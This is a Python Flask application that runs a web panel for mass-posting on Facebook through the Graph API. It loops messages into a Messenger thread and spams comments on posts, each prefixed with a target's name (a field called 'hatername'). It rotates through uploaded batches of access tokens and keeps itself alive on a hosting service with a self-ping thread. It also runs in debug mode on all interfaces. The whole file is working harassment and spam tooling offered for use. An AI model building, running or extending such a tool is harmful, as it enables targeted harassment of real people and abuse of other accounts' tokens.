from flask import Flask, request, render_template
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# In-memory task tracking
stop_events = {}
threads = {}

# Facebook API headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

@app.route('/')
def home():
    return render_template("home.html")

@app.route('/convo', methods=['GET','POST'])
def convo():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        ✅ Convo Task Started!<br>
        🧠 Stop Key: <b>{task_id}</b><br><br>
        <form method="POST" action="/stop">
            <input name="taskId" value="{task_id}" readonly>
            <button type="submit">🛑 Stop</button>
        </form>
        '''
    return render_template("convo_form.html")

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                print("✅" if response.status_code == 200 else "❌", message)
                time.sleep(time_interval)

@app.route('/post', methods=['GET','POST'])
def post():
    if request.method == 'POST':
        count = int(request.form.get('count', 0))
        task_ids = []

        for i in range(1, count + 1):
            post_id = request.form.get(f"id_{i}")
            hname = request.form.get(f"hatername_{i}")
            delay = request.form.get(f"delay_{i}")
            token_file = request.files.get(f"token_{i}")
            msg_file = request.files.get(f"comm_{i}")

            if not (post_id and hname and delay and token_file and msg_file):
                return f"❌ Missing required fields for post #{i}"

            tokens = token_file.read().decode().strip().splitlines()
            comments = msg_file.read().decode().strip().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            stop_events[task_id] = Event()
            thread = Thread(target=post_comments, args=(post_id, tokens, comments, hname, int(delay), task_id))
            thread.start()
            threads[task_id] = thread
            task_ids.append(task_id)

        response = ""
        for tid in task_ids:
            response += f"""
                ✅ Post Task Started!<br>
                🧠 Stop Key: <b>{tid}</b><br><br>
                <form method='POST' action='/stop'>
                    <input type='hidden' name='taskId' value='{tid}'>
                    <button type='submit'>🛑 Stop This Task</button>
                </form><br><hr>
            """
        return response

    return render_template("post_form.html")

def post_comments(post_id, tokens, comments, hname, delay, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        comment = f"{hname} {random.choice(comments)}"
        token = tokens[token_index % len(tokens)]
        url = f"https://graph.facebook.com/{post_id}/comments"
        res = requests.post(url, data={"message": comment, "access_token": token})
        print("✅" if res.status_code == 200 else "❌", comment)
        token_index += 1
        time.sleep(delay)

@app.route('/stop', methods=['GET','POST'])
def stop():
    if request.method == 'POST':
        task_id = request.form['taskId']
        if task_id in stop_events:
            stop_events[task_id].set()
            return f"🛑 Task <b>{task_id}</b> has been stopped!"
        return "❌ Invalid Stop Key"
    return '''
    <h3>Stop a Running Task</h3>
    <form method="POST">
        <input name="taskId" placeholder="Paste Stop Key here">
        <button type="submit">🛑 Stop</button>
    </form>
    '''

# -------------------- Self-Ping Feature --------------------
def self_ping():
    url = "https://cha7-upda7ed.onrender.com"  # Replace with your deployed app URL if needed
    while True:
        try:
            requests.get(url)
            print("🌐 Self-ping successful")
        except:
            print("⚠️ Self-ping failed")
        time.sleep(300)  # Ping every 5 minutes

if __name__ == '__main__':
    # Start self-ping thread
    ping_thread = Thread(target=self_ping, daemon=True)
    ping_thread.start()

    app.run(host='0.0.0.0', port=10000)
